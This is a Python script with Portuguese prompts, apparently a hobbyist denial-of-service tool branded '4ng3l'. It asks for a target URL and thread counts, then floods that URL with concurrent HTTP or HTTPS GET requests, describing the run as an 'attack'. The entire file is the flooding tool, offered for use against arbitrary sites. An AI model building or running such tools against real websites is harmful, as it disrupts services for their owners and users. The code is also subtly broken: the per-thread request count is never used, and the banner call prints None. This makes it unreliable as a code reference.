import aiohttp
import asyncio
import pyfiglet

text =pyfiglet.print_figlet(text="4ng3l",width=150, colors = "YELLOW", font = "doh")

print(text)

async def send_request(url, session):
    try:
        async with session.get(url) as response:
            print(f"Solicitação enviada para: {url}")
            # Aqui pode adicionar lógica de processamento da resposta, se necessário
    except Exception as e:
        print(f"Erro ao enviar solicitação: {e}")

async def attack(url, num_requests, num_threads):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(num_threads):
            task = asyncio.ensure_future(send_request(url, session))
            tasks.append(task)

        await asyncio.gather(*tasks)

async def get_user_input(prompt):
    return input(prompt)

async def main():
    print("Selecione o tipo de ataque:")
    print("1. Ataque HTTP")
    print("2. Ataque HTTPS")
    choice = await get_user_input("Digite o número da sua escolha: ")

    if choice == '1':
        url = await get_user_input("Insira o URL alvo: ")
        num_requests = int(await get_user_input("Insira o número de solicitações por thread: "))
        num_threads = int(await get_user_input("Insira o número de threads: "))
        print("Iniciando ataque HTTP...")
        await attack(url, num_requests, num_threads)
    elif choice == '2':
        url = await get_user_input("Insira o URL alvo (HTTPS): ")
        num_requests = int(await get_user_input("Insira o número de solicitações por thread: "))
        num_threads = int(await get_user_input("Insira o número de threads: "))
        print("Iniciando ataque HTTPS...")
        await attack(url, num_requests, num_threads)
    else:
        print("Opção inválida")

if __name__ == "__main__":
    asyncio.run(main())
